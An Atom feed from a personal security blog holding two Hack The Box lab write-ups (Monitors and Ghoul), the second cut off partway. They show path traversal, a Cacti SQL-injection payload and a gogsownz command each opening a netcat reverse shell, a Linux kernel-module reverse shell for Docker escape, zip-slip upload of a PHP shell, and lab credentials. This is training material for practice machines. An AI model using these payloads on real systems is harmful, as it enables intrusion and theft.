<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-05-13T13:51:59+01:00</updated><id>/feed.xml</id><title type="html">EntrophyBlog</title><subtitle></subtitle><author><name>Entrophy</name></author><entry><title type="html">Monitors</title><link href="/htb/monitors/" rel="alternate" type="text/html" title="Monitors" /><published>2021-05-13T00:00:00+01:00</published><updated>2021-05-13T00:00:00+01:00</updated><id>/htb/monitors</id><content type="html" xml:base="/htb/monitors/">&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;

&lt;p&gt;The first thing is to use nmap for scan ports :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sSCV -v -A -p- -Pn 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 23:41 CDT
Nmap scan report for 10.10.10.238
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.76 seconds


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As always add &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;monitors.htb&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; and we get the following webpage.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/monitor/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It is powered by wordpress so just try &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan&lt;/code&gt; out&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan --url http://monitors.htb/ -e ap,cb,dbe

....

[+] wp-with-spritz
 | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2015-08-20T20:15:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 4.2.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt

...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;It seems that there is a vulnerability - &lt;a href=&quot;https://www.exploit-db.com/exploits/44544&quot;&gt;https://www.exploit-db.com/exploits/44544&lt;/a&gt; :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd 


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Try to get wordpress config under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/wordpress/wp-config.php&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//var/www/wordpress/wp-config.php

...

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wpadmin' );

/** MySQL database password */
define( 'DB_PASSWORD', 'BestAdministrator@2020!' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


...

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Unfortunately the password does not work, try to gather some extra information:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/monitor/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a new vhost appeared &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti.monitors.htb&lt;/code&gt;! Add it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file and visit the website.&lt;/p&gt;

&lt;p&gt;Use the wordpress credentials for login and we are in. The framework is version 1.2.12 â€“&amp;gt; &lt;a href=&quot;https://www.exploit-db.com/exploits/49810&quot;&gt;https://www.exploit-db.com/exploits/49810&lt;/a&gt;. 
I had to do it manually via burp :&lt;/p&gt;

&lt;p&gt;Step  1:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cacti/color.php?action=export&amp;amp;header=false&amp;amp;filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth%3bupdate+settings+set+value%3d'rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&amp;gt;%261|nc+10.10.14.54+443+&amp;gt;/tmp/f%3b'+where+name%3d'path_php_binary'%3b--+-
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Step 2:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/cacti/host.php?action=reindex
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and I obtained a reverse shell as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www-data&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the system I found an interesting service called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cacti-backup.service&lt;/code&gt; which points at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/marcus/.backup/backup.sh&lt;/code&gt;. Just reading the content in order to obtain marcus ssh password!&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VerticalEdge2020&lt;/code&gt;&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;

&lt;p&gt;Running enumeration on the host it is possible to see a new port running locally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt;.
So we do pivoting through ssh using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -L 8443:localhost:8443 marcus@monitors.htb&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/monitor/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we see the server runs tomcat version 9.0.31. After some research, I discovered that Tomcat is now part of Apache OfBiz, so I checked some vulnerabilities for also that framework and found &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2020-9496&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;use exploit/linux/http/apache_ofbiz_deserialization
set LHOST 10.10.x.x
set RHOSTS 127.0.0.1
set payload linux/x64/shell/reverse_tcp
set forceexploit true
run
&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;and we got shell as root into the docker container (there is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.dockernev&lt;/code&gt; ) . So now we need to evade the docker somehow.
Checking the capabilities with linpeas we can notice that we have  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt; which is really interesting. I followed different articles ( &lt;a href=&quot;https://xcellerator.github.io/posts/docker_escape/&quot;&gt;https://xcellerator.github.io/posts/docker_escape/&lt;/a&gt; , &lt;a href=&quot;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&quot;&gt;https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd&lt;/a&gt;) which mainly prove that, due to the fact that the kernel for the container is the same as the host, we can evade the container installing a module which interacts directly with the kernel.&lt;/p&gt;

&lt;p&gt;So I just created two files, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Makefile&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse.c&lt;/code&gt; :&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Makefile

obj-m +=reverse.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean


&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reverse.c

#include &amp;lt;linux/kmod.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;AttackDefense&quot;);
MODULE_DESCRIPTION(&quot;LKM reverse shell module&quot;);
MODULE_VERSION(&quot;1.0&quot;);
char* argv[] = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.0.1/4444 0&amp;gt;&amp;amp;1&quot;, NULL};
static char* envp[] = {&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;, NULL };
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
printk(KERN_INFO &quot;Exiting\n&quot;);
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After having uploaded them onto the docker container, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -o&lt;/code&gt;,  compile them through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;make all&lt;/code&gt; command (if you encounter compilation problems and errors just run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/&lt;/code&gt;) and then open a netcat listener on the host as marcus&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc -lnvp 4444&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;At last run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;insmod reverse.ko&lt;/code&gt;. And we obtain a reverse shell back as root. Enjoy!&lt;/p&gt;</content><author><name>Entrophy</name></author><category term="HTB" /><summary type="html">User</summary></entry><entry><title type="html">Ghoul</title><link href="/htb/ghoul/" rel="alternate" type="text/html" title="Ghoul" /><published>2019-10-04T00:00:00+01:00</published><updated>2019-10-04T00:00:00+01:00</updated><id>/htb/ghoul</id><content type="html" xml:base="/htb/ghoul/">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;

&lt;p&gt;As usual we always start with &lt;strong&gt;Nmap&lt;/strong&gt; scanning:&lt;/p&gt;

&lt;pre&gt;root@pentestbox:~# nmap -sC -sV -oA ghoul 10.10.10.101

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: A64A06AAE4304C2B3921E4FA5C9FF39C
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Aogiri Tree
2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Aogiri
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88 - Error report

&lt;/pre&gt;

&lt;p&gt;Due to the fact that there doesnâ€™t seems to be nothing really interesting on the website on port 80 and that the one on port 8080 is protected from a basic authentication, I run gobuster on port 80.&lt;/p&gt;

&lt;pre&gt; /root/go/bin/gobuster dir -u http://10.10.10.101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -o gobuster --timeout 30s

/index.html (Status: 200)
/images (Status: 301)
/blog.html (Status: 200)
/contact.html (Status: 200)
/archives (Status: 301)
/uploads (Status: 301)
/users (Status: 301)
/css (Status: 301)
/js (Status: 301)
/secret.php (Status: 200)
/less (Status: 301)
/server-status (Status: 403)
&lt;/pre&gt;

&lt;p&gt;This reveals an interesting page, secret.php.
It shows a chat between system admins  talking about an RCE on the current infrastructure.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/secret_1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Due to the fact that the enumeration didnâ€™t show anything else interesting here I swapped port and went to port 8080. I then tried &lt;strong&gt;admin:admin&lt;/strong&gt; and it worked, revealing a website for uploading images or zip files on the server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/zip_2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After a few tests in which I verified that it is not possible to easily evade the file-type filters of the upload form I searched a bit on google and I found the Ziplib vulnerability (https://github.com/snyk/zip-slip-vulnerability). This vulnerability allows to write arbitrary files because the zip archives contains directory traversal filenames.&lt;/p&gt;

&lt;p&gt;The main Idea is then to being able to upload a php reverse shell on the webserver using this vulnerability. I took then the reverse.php from kali and created a set of folders with depth 5 - just to being sure to reach the / folder of the target system- in order to run the following command:&lt;/p&gt;

&lt;pre&gt;
zip ziplib_www.zip ../../../../../var/www/html/rev.php
&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/zip_slip_3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once uploaded the ziplib_www.zip file using the upload form, connecting to http://10.10.10.101:80/rev.php returns a reverse shell on our netcat listener.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/rev_4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the box, I noticed that there are three users with a login: eto,kaneki and noro.
LinEnum.sh shows up interesting backup files under the folder /var/backups . After having downloaded the whole directory using a meterpreter session and figured out that most of the files are rabbit holes I focused only on the directory /var/backups/backups/keys, which contains three old ssh private keys of the three users.
Unfortunately all these keys are encrypted so I had to find a way to decrypt those. I tried then to use JTR , converting the ssh keys using ssh2john script:&lt;/p&gt;

&lt;pre&gt; python /root/Documents/cryptography/JohnTheRipper/run/ssh2john.py kaneki.backup &lt;/pre&gt;

&lt;p&gt;After multiple failures using rockyou for cracking the three of them, I decided to use cewl on the secret.php page in order to create an alternative wordlist.&lt;/p&gt;

&lt;pre&gt;cewl http://10.10.10.101/secret.php &amp;gt; cewl.txt&lt;/pre&gt;

&lt;p&gt;And finally I got it cracked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/ssh_pswd_5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ssh decryption password for kaneki ssh is &lt;strong&gt;ILoveTouka&lt;/strong&gt; and I am finally able to login as kaneki. 
Got user !&lt;/p&gt;

&lt;h1 id=&quot;root&quot;&gt;ROOT&lt;/h1&gt;

&lt;p&gt;The first thing to notice are two notes present into the home folder of kaneki:&lt;/p&gt;

&lt;pre&gt;note.txt :Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts

notes : I've set up file server into the server's network ,Eto if you need to transfer files to the server can use my pc. DM me for the access.&lt;/pre&gt;

&lt;p&gt;These are interesting because they make me understand two things:  first , there is another vulnerability to exploit around, probably usefull for privesc, and second, that we are into a virtualized network, specifically a Docker container - we can notice the file .dockerenv in the / folder.&lt;/p&gt;

&lt;p&gt;Indeed, looking at ifconfig:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/ifconfig_6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So apparently there is an internal network 172.20.0.0/24 and we need to explore it.
Indeed, after uploading nmap and having run:&lt;/p&gt;

&lt;pre&gt;nmap -p-  172.20.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-05 14:40 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.20.0.1)
Host is up (0.00026s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for Aogiri (172.20.0.10)
Host is up (0.00028s latency).
Not shown: 1204 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-alt

Nmap scan report for 64978af526b2.Aogiri (172.20.0.150)
Host is up (0.00030s latency).
Not shown: 1206 closed ports
PORT   STATE SERVICE
22/tcp open  ssh&lt;/pre&gt;

&lt;p&gt;Enumerating more the whole FileSystem and searching for tomcat configuration files, which could contain interesting credentials, I found the following file:
/usr/share/tomcat7/conf/tomcat-users.xml which contains a commented line :&lt;/p&gt;

&lt;pre&gt; user username=&quot;admin&quot; password=&quot;test@aogiri123&quot; roles=&quot;admin&quot; &lt;/pre&gt;

&lt;p&gt;Maybe it would be usefull later on.
So it is clear that we have a new host in the network. Reading inside the .ssh folder of kaneki user I noticed a new ID of the current user:&lt;/p&gt;

&lt;pre&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDhK6T0d7TXpXNf2anZ/02E0NRVKuSWVslhHaJjUYtdtBVxCJg+wv1oFGPij9hgefdmFIKbvjElSr+rMrQpfCn6v7GmaP2QOjaoGPPX0EUPn9swnReRgi7xSKvHzru/ESc9AVIQIaeTypLNT/FmNuyr8P+gFLIq6tpS5eUjMHFyd68SW2shb7GWDM73tOAbTUZnBv+z1fAXv7yg2BVl6rkknHSmyV0kQJw5nQUTm4eKq2AIYTMB76EcHc01FZo9vsebBnD0EW4lejtSI/SRC+YCqqY+L9TZ4cunyYKNOuAJnDXncvQI8zpE+c50k3UGIatnS5f2MyNVn1l1bYDFQgYl &lt;b&gt;kaneki_pub@kaneki-pc&lt;/b&gt;
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsiPbWC8feNW7o6emQUk12tFOcucqoS/nnKN/LM3hCtPN8r4by8Ml1IR5DctjeurAmlJtXcn8MqlHCRbR6hZKydDwDzH3mb6M/gCYm4fD9FppbOdG4xMVGODbTTPV/h2Lh3ITRm+xNHYDmWG84rQe++gJImKoREkzsUNqSvQv4rO1RlO6W3rnz1ySPAjZF5sloJ8Rmnk+MK4skfj00Gb2mM0/RNmLC/rhwoUC+Wh0KPkuErg4YlqD8IB7L3N/UaaPjSPrs2EDeTGTTFI9GdcT6LIaS65CkcexWlboQu3DDOM5lfHghHHbGOWX+bh8VHU9JjvfC8hDN74IvBsy120N5 kaneki@Aogiri&lt;/pre&gt;

&lt;p&gt;Acknoweldging that we are currently into the Aogiri host, guess drives me to say that probably 172.20.0.150 is kaneki-pc. 
I tried then to use the current private ssh key present into the ssh folder of kaneki to connect to the remote host:&lt;/p&gt;

&lt;pre&gt;kaneki@Aogiri:~/.ssh$ ssh -i id_rsa kaneki_pub@172.20.0.150&lt;/pre&gt;

&lt;p&gt;Using the same password as before .. and it worked, I am in!
I noticed then another text file:&lt;/p&gt;

&lt;pre&gt;to-do.txt : Give AogiriTest user access to Eto for git.&lt;/pre&gt;

&lt;p&gt;This means that there is a git repo somewhere on one of these hosts, which could contain interesting info. Moreover, looking at ifconfig, I noticed that this box is connected to a new subnet,172.18.0.0/24:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/ifconfig_7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In order to upload nmap also on this box, I used an ssh tunneling:&lt;/p&gt;

&lt;pre&gt;ssh -L 9000:172.20.0.150:22 -i ./Backups/kaneki.backup  kaneki@10.10.10.101
scp -P9000 -i id_rsa ./nmap kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;

&lt;p&gt;And in this way I have been able to successfully upload nmap to kaneki-pc ( 172.20.0.150 ).&lt;/p&gt;

&lt;pre&gt;kaneki_pub@kaneki-pc:/tmp$ ./nmap -p- 172.18.0.0-255

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-05-06 13:14 GMT
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for Aogiri (172.18.0.1)
Host is up (0.00023s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
2222/tcp  open  unknown
8080/tcp  open  http-alt
10007/tcp open  unknown

Nmap scan report for cuff_web_1.cuff_default (172.18.0.2)
Host is up (0.00028s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  unknown - HTTP

Nmap scan report for kaneki-pc (172.18.0.200)
Host is up (0.00030s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
&lt;/pre&gt;

&lt;p&gt;As it is possible to observer, there is a new host ,172.18.0.2, with ssh and http open on port 3000. In order to check what  is present on that server, I had to tunnel again over ssh, using this time the existing tunnel already present.&lt;/p&gt;

&lt;pre&gt;ssh -L 9100:172.18.0.2:3000 -i id_rsa  kaneki_pub@localhost -p 9000 &lt;/pre&gt;

&lt;p&gt;And we can see a login screen of Gogs.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/web_8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After enormous time spent bruteforcing the credentials I just tried to use all users and passwords already found on the box and I finally found the right combination.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;AogiriTest:test@aogiri123&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/gogs_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From a previous note we know there is a vulnerability on gogs so google is our best friend here..
And I found this coll github repo with Poc : https://github.com/TheZ3ro/gogsownz.
So mainly we are able to obtain a RCE on gogs. Letâ€™s try to obtain a reverse shell!&lt;/p&gt;

&lt;p&gt;After having uploaded netcat through scp :&lt;/p&gt;

&lt;pre&gt; scp -P9000 -i id_rsa ./ncat kaneki_pub@127.0.0.1:/tmp&lt;/pre&gt;

&lt;p&gt;and having started a local listener we run the following command:&lt;/p&gt;

&lt;pre&gt;python3 gogsownz.py http://127.0.0.1:9100/ -C 'AogiriTest:test@aogiri123' --rce 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 172.18.0.200 8000 &amp;gt;/tmp/f'  --cleanup&lt;/pre&gt;

&lt;p&gt;And I am git on 172.18.0.2!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/root_9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Enumerating the system I noticed that there is only one user except root, which git, which seems mandatory for Gogs. This seems pointless so go on with enumeration!
Letâ€™s try with classical Linux enumeration files using  https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
Running enumeration for SUID binaries we see something interesting:&lt;/p&gt;

&lt;pre&gt;/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/expiry
&lt;b&gt;/usr/sbin/gosu&lt;/b&gt;
/bin/su&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/gosu_10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So just running:&lt;/p&gt;

&lt;pre&gt;gosu root bash&lt;/pre&gt;

&lt;p&gt;allows to become root.&lt;/p&gt;

&lt;p&gt;Going into the /root folder I can see interesting information:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//assets/images/Ghoul/root_12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we have new credentials :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;kaneki:12345ILoveTouka!!!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;I tried to log in into Gogs with those but there is only a gogstest report, totally empty and useless. Lets focus on the other file: &lt;strong&gt;aogiri-app.7z&lt;/strong&gt;
After having downloaded it locally:&lt;/p&gt;

&lt;pre&gt;chmod 777 aogiri-app.7z
cp aogiri-app.7z /tmp
ncat -l -p 1234 -q 1 &amp;gt; aogiri-app.7z&amp;lt; /dev/null â†’ on 172.18.0.200
cat aogiri-app.7z | nc 172.18.0.200 1234 â†’ on 172.18.0.2
scp -P9000 -i id_rsa kaneki_pub@127.0.0.1:/tmp/aogiri-app.7z  ./aogiri-app.7z &lt;/pre&gt;

&lt;p&gt;I started looking at it closely. It is a git repository. Really interesting.
It seems that initially I found some creds but unfortunately useless :(&lt;/p&gt;

&lt;pre&gt;/src/main/resources# cat application.properties 
server.port=8080
spring.datasource.url=jdbc:mysql://172.18.0.1:3306/db
spring.datasource.username=kaneki
spring.datasource.password=jT7Hr$.[nF.)c)4C
server.address=0.0.0.0

spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5InnoDBDialect
spring.jpa.hibernate.ddl-auto = validate

